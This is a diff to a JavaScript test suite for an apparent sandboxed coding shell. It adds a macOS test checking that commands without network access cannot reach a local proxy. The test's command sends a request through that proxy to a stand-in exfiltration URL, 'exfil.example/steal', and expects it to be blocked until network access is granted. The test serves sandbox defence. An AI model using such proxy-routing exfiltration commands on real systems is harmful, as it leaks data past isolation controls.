@@ -34,6 +34,18 @@ test('a command whose background process outlives it cannot hold the runner past
  }finally{shell.close();try{execFileSync('pkill',['-f','sleep 25']);}catch{}await rm(root,{recursive:true,force:true});}
 });
 
+test('without network access a command cannot reach a service on this Mac, such as a local proxy that forwards to the internet',{skip:process.platform!=='darwin',timeout:60000},async()=>{
+ const root=await mkdtemp('/tmp/buddy-loopback-test-'),shell=new CodingShell();await mkdir(root+'/project');
+ const hits=[];const proxy=createServer((req,res)=>{hits.push(req.url);res.end('forwarded');});await new Promise(r=>proxy.listen(0,'127.0.0.1',r));
+ const through=`node -e 'const r=require("http").request({host:"127.0.0.1",port:${proxy.address().port},path:"http://exfil.example/steal",headers:{Host:"exfil.example"}},res=>{res.on("data",x=>console.log("GOT "+x));res.on("end",()=>process.exit(0))});r.on("error",e=>{console.log("ERR "+e.code);process.exit(3)});r.end()'`;
+ try{
+  let result=await shell.run({cwd:root+'/project',scratch:root+'/scratch',code:through});
+  assert.match(result.output,/ERR EPERM/,result.output);assert.notEqual(result.exitCode,0);assert.deepEqual(hits,[],'the proxy never saw the request');
+  result=await shell.run({cwd:root+'/project',scratch:root+'/scratch',code:through,network:true});
+  assert.match(result.output,/GOT forwarded/,'after review (network access) the same command works');assert.deepEqual(hits,['http://exfil.example/steal']);
+ }finally{shell.close();proxy.close();await rm(root,{recursive:true,force:true});}
+});
+
 function pages(){return createServer((req,res)=>{res.setHeader('Content-Type','text/html');res.end(req.url.startsWith('/spin')?'<title>spin</title><script>for(;;){}</script>':'<title>fine</title><h1>All good</h1>');});}
 test('a page that never yields cannot block the private browser for good',{timeout:60000},async()=>{
  const server=pages();await new Promise(r=>server.listen(0,'127.0.0.1',r));const origin=`http://127.0.0.1:${server.address().port}`,root=await mkdtemp(join(tmpdir(),'buddy-spin-test-'));
